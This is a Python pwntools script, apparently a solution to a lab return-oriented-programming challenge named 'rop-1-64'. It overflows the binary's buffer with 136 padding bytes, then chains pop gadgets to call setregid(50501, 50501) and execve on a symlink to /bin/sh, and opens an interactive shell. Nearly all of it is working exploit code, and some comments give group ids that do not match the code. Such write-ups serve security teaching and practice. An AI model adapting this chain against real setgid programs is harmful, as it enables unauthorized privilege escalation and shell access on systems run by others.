#!/usr/bin/env python2

import os

# import pwntools
from pwn import *

env = {}

# prepare the program name and args
argv = [
    #"/home/labs/week6/challenges/rop/rop-2-64",
    "./rop-1-64",
]

p = process(argv, env=env)

setregid_addr = p.elf.symbols['setregid']
execve_addr = p.elf.symbols['execve']
string_addr = 0x400732 # 0xb8

#0x00000000004007b3 : pop rdi ; ret
#0x0000000000400699 : pop rdx ; ret
#0x00000000004007b1 : pop rsi ; pop r15 ; ret

p_rdi_r = 0x4007b3
p_rdx_r = 0x400699
p_rsi_p_r15_r = 0x4007b1

if os.path.exists("\xb8"):
    os.unlink("\xb8")
if not os.path.exists("\xb8"):
    os.symlink("/bin/sh", "\xb8")

# prepare an exploit string
# [dummy][setregid][pop-pop-ret][36001][36001][execve][XXXX][addr of "\xb8"][0][0]

calling_setregid = \
    p64(p_rdi_r) + p64(50501) + \
    p64(p_rsi_p_r15_r) + p64(50501) + p64(50501) + \
    p64(setregid_addr)

# pop %rdi <- 36002
# pop %rsi <- 36002, pop %r15 <- 36002
# ret <- setregid_addr

calling_execve = \
    p64(p_rdi_r) + p64(string_addr) + \
    p64(p_rsi_p_r15_r) + p64(0) + p64(0) + \
    p64(p_rdx_r) + p64(0) + \
    p64(execve_addr)

exploit_string = "D"* 136 + calling_setregid + calling_execve


# Print your exploit as a txt file.
# You can use this in gdb, e.g.,
#   gdb-peda$ r < exploit.txt
with open("exploit.txt", "wb") as f:
    f.write(exploit_string)
    f.close()

# send the exploit
p.sendline(exploit_string)

# get an interactive pipe
print p.interactive()
